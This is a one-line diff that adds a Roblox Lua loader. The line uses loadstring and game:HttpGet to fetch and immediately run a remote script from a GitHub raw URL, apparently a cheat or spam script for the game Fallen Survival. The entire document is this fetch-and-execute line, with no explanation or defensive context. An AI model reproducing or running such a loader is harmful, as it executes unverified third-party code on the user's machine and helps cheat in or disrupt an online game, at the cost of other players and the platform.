@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/upd-fallen-survival-spam2-v64mw95yomi5nd.lua"))()
